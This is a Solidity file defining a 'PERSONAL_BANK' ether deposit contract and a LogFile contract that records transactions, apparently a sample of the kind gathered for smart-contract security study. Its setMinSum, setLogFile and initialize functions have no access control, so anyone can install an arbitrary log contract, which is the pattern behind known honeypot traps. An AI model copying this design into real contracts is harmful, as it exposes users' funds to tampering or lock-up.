pragma solidity ^0.5.0;

contract PERSONAL_BANK {
    mapping (address=>uint256) public balances;   
   
    uint public MinSum = 1 ether;
    
    LogFile Log;
    
    bool initialized;
    
    constructor(address _log) public {
        Log = LogFile(_log);
    }
    
    function setMinSum(uint _val) public {
        require(!initialized, "Contract has already been initialized.");
        MinSum = _val;
    }
    
    function setLogFile(address _log) public {
        require(!initialized, "Contract has already been initialized.");
        Log = LogFile(_log);
    }
    
    function initialize() public {
        initialized = true;
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.addMessage(msg.sender, msg.value, "Put");
    }
    
    function collect(uint _am) public {
        require(balances[msg.sender] >= MinSum, "Minimum balance not met.");
        require(balances[msg.sender] >= _am, "Insufficient balance.");
        balances[msg.sender] -= _am;
        msg.sender.transfer(_am);
        Log.addMessage(msg.sender, _am, "Collect");
    }
    
    function() external payable {
        deposit();
    }
}

contract LogFile {
    struct Message {
        address Sender;
        string Data;
        uint Val;
        uint Time;
    }
    
    Message[] public History;
    
    function addMessage(address _adr, uint _val, string memory _data) public {
        Message memory msg;
        msg.Sender = _adr;
        msg.Time = now;
        msg.Val = _val;
        msg.Data = _data;
        History.push(msg);
    }
}